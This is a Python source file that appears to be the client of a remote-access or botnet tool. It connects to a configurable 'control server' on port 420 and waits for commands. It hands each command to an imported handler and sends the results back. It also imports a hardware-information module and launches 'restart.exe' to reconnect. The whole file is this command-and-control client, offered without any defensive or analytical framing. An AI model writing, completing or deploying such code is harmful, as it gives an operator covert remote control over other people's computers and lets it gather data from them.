import os
import socket
import random as rand
import threading
import time as t
import functions.cmd_handler as cmd_handler
import functions.commands.client_hardware_info as client_hardware_info


server_host = '' # control server ip
server_port = 420
is_connected = False

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connection_handler():
    while True:
        try:
            server_cmd = client_socket.recv(1024).decode('utf-8')
            res = cmd_handler.handle(server_cmd)
            if res == False:
                pass
            else:
                print(res)
                client_socket.send(res.encode('utf-8'))
        except:
            print("Diconnected")
            try:
                os.system("restart.exe")
                print("Reconnected")
                return
            except:
                print("Still diconnected")
        t.sleep(3)

thread_01 = threading.Thread(target=connection_handler)

while is_connected == False:
    try:
        client_socket.connect((server_host, server_port))
        is_connected = True
        thread_01.start()
        print("Connected to " + server_host)
    except:
        print('Cannot open Connection to Server!')